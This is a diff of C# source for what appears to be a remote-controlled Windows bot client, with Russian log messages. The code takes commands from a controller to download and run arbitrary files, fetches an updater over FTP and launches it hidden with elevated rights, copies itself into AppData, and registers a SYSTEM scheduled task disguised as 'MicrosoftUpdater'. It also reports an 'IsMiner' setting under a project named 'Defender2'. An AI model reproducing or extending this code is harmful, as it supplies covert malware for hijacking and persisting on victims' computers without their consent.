@@ -13,40 +13,40 @@ namespace ClientWorker
 	{
 
         public void Start()
-		{
-            
-		}
-
-        public void AnalysisAnswer(string answer)
         {
-            string comand = answer.Split('_')[0];
-            List<string> parametrs = new List<string>();
-            parametrs.AddRange(answer.Split('_'));
-            parametrs.Remove(comand);
 
-            switch (comand)
+        }
+
+        public void Analysis(string answer)
+        {
+            string text = answer.Split('_')[0];
+            List<string> list = new List<string>();
+            list.AddRange(answer.Split('_'));
+            list.Remove(text);
+
+            switch (answer)
             {
                 case "GetInfoDevice":
-                    SendInfoDevice();
+                   SendInfoDevice();
                     Log.Send("SendInfoDevice()");
+                    break;
+
+                case "DownlUpd":
+                    GetUpd();
+                    Log.Send("GetUpd()");
+                    break;
+
+                case "DownloadAndRun":
+                    foreach (string prm in list)
+                    {
+                       FileManager.GetFileAndRun(prm);
+                    }
+                    Log.Send("DownloadAndRun()");
                     break;
 
                 case "GetSettings":
                     SendSetting();
                     Log.Send("SendSetting()");
-                    break;
-
-                case "DownloadAndRun":
-                    foreach (string prm in parametrs)
-                    {
-                        FileManager.GetFileAndRun(prm);
-                    }
-                    Log.Send("DownloadAndRun()");
-                    break;
-
-                case "DownloadUpdater":
-                    GetUpdater();
-                    Log.Send("GetUpdater()");
                     break;
 
                 case "GetLogList":
@@ -66,14 +66,14 @@ namespace ClientWorker
             }
         }
 
-        public void GetUpdater()
+        public void GetUpd()
         {
-            Log.Send("GetUpdater()");
+            Log.Send("GetUpd()");
             string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
             try
             {
                 KillUpdater();
-                FtpClient.FTPDownloadFile(StartData.updater, folderPath + StartData.floaderNewCopy);
+                FtpClient.DownloadF(StartData.updater, folderPath + StartData.floaderNewCopy);
                 new Process
                 {
                     StartInfo =
@@ -81,7 +81,7 @@ namespace ClientWorker
                         FileName = folderPath + StartData.floaderNewCopy + StartData.updater,
                         WindowStyle = ProcessWindowStyle.Hidden,
                         Verb = "runas",
-                        Arguments = Program.nameProcess
+                        Arguments = Program.nameProc
                     }
                 }.Start();
             }
@@ -99,36 +99,37 @@ namespace ClientWorker
             }
 
             string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            folderPath += StartData.floaderNewCopy;
 
-            File.Delete(folderPath + StartData.floaderNewCopy + StartData.updater);
+            File.Delete(folderPath + StartData.updater);
         }
         public void Reconnect()
-		{
-			Log.Send("Reconnect()");
-			try
-			{
-				Program.client.Clear();
-				Program.clientThread.Abort();
-			}
-			catch
-			{
+        {
+            Log.Send("Reconnect()");
+            try
+            {
+                Program.netSender.Clear();
+                Program.netSenderThread.Abort();
+            }
+            catch
+            {
 
             }
 
-			Program.clientThread = new Thread(new ThreadStart(Program.client.Start));
-			Program.clientThread.Start();
-		}
+            Program.netSenderThread = new Thread(new ThreadStart(Program.netSender.Start));
+            Program.netSenderThread.Start();
+        }
 
         private void SendSetting()
         {
-            NetworkStream stream = Program.client.stream;
+            NetworkStream stream = Program.netSender.netStream;
             byte[] bytes;
 
-            bytes = Encoding.Unicode.GetBytes(Service.Properties.Settings.Default.Comp_name + StartData.delimiter +
-                Service.Properties.Settings.Default.IsMiner + StartData.delimiter +
-                Service.Properties.Settings.Default.Open_sum + StartData.delimiter +
-                Service.Properties.Settings.Default.Start_time + StartData.delimiter +
-                Service.Properties.Settings.Default.Version);
+            bytes = Encoding.Unicode.GetBytes(Defender2.Properties.Settings.Default.Comp_name + StartData.delimiter +
+                Defender2.Properties.Settings.Default.IsMiner + StartData.delimiter +
+                Defender2.Properties.Settings.Default.Open_sum + StartData.delimiter +
+                Defender2.Properties.Settings.Default.Start_time + StartData.delimiter +
+                Defender2.Properties.Settings.Default.Version);
 
             stream.Write(bytes, 0, bytes.Length);
 
@@ -140,59 +141,59 @@ namespace ClientWorker
 
         }
         private void SendLogList()
-		{
-			NetworkStream stream = Program.client.stream;
-			byte[] bytes;
-			foreach (string s in Log.messages)
-			{
-				bytes = Encoding.Unicode.GetBytes(s);
-				stream.Write(bytes, 0, bytes.Length);
+        {
+            NetworkStream stream = Program.netSender.netStream;
+            byte[] bytes;
+            foreach (string s in Log.messages)
+            {
+                bytes = Encoding.Unicode.GetBytes(s);
+                stream.Write(bytes, 0, bytes.Length);
                 Thread.Sleep(0);
-			}
-			bytes = Encoding.Unicode.GetBytes("EndLog");
-			stream.Write(bytes, 0, bytes.Length);
-		}
+            }
+            bytes = Encoding.Unicode.GetBytes("EndLog");
+            stream.Write(bytes, 0, bytes.Length);
+        }
 
-		public static void Registration()
-		{
-			Log.Send("Registration()");
-			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-			CreateTask();
-			Proliferation(folderPath);
-		}
+        public static void Registration()
+        {
+            Log.Send("Registration()");
+            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            CreateTask();
+            Proliferation(folderPath);
+        }
 
-		public static void Proliferation(string parth)
-		{
-			Log.Send("Proliferation()");
-			parth += StartData.floaderNewCopy;
-			string executablePath = Application.ExecutablePath;
-			try
-			{
-				if (!File.Exists(parth + StartData.service))
-				{
-					DirectoryInfo directoryInfo = Directory.CreateDirectory(parth);
-					File.Copy(executablePath, parth + StartData.service);
-				}
-			}
-			catch (Exception ex)
-			{
+        public static void Proliferation(string parth)
+        {
+            Log.Send("Proliferation()");
+            parth += StartData.floaderNewCopy;
+            string executablePath = Application.ExecutablePath;
+            try
+            {
+                if (!File.Exists(parth + StartData.service))
+                {
+                    DirectoryInfo directoryInfo = Directory.CreateDirectory(parth);
+                    File.Copy(executablePath, parth + StartData.service);
+                }
+            }
+            catch (Exception ex)
+            {
                 Log.Send("Ошибка копирования :" + ex.Message);
-			}
-		}
+            }
+        }
 
-		public static void CreateTask()
-		{
-			new Process
-			{
-				StartInfo = 
-				{
-					FileName = "cmd.exe",
-					Verb = "runas",
-					Arguments = "/C SCHTASKS /Create /RU SYSTEM /SC ONLOGON /TN MicrosoftUpdater /TR C:\\Users\\Fox\\AppData\\Roaming\\MicrosoftUpdater\\" + StartData.service,
-					WindowStyle = ProcessWindowStyle.Hidden
-				}
-			}.Start();
-			Log.Send("Задача создана");
-		}		
-	}
+        public static void CreateTask()
+        {
+            new Process
+            {
+                StartInfo =
+                {
+                    FileName = "cmd.exe",
+                    Verb = "runas",
+                    Arguments = "/C SCHTASKS /Create /RU SYSTEM /SC ONLOGON /TN MicrosoftUpdater /TR C:\\Users\\Fox\\AppData\\Roaming\\MicrosoftUpdater\\" + StartData.service,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                }
+            }.Start();
+            Log.Send("Задача создана");
+        }
+    }
 }
